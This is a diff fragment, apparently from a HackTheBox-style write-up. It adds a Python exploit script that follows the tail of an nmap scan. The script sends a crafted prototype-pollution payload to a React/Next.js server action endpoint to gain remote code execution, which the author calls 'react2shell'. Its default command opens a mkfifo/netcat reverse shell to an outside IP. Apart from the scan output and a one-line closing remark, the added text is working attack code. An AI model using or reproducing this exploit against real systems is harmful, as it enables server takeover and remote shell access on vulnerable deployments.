@@ -73,3 +73,39 @@ SF:n:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request
 SF:\r\nConnection:\x20close\r\n\r\n");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
+```
+import requests
+import sys
+import json
+
+BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://reactor.htb:3000"
+EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.186 4444 >/tmp/f"
+crafted_chunk = {
+    "then": "$1:__proto__:then",
+    "status": "resolved_model",
+    "reason": -1,
+    "value": '{"then": "$B0"}',
+    "_response": {
+        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
+        # If you don't need the command output, you can use this line instead:
+        # "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
+        "_formData": {
+            "get": "$1:constructor:constructor",
+        },
+    },
+}
+
+files = {
+    "0": (None, json.dumps(crafted_chunk)),
+    "1": (None, '"$@0"'),
+}
+
+headers = {"Next-Action": "x"}
+res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
+print(res.status_code)
+print(res.text)
+```
+
+form this i get rce of cve react2shell
+
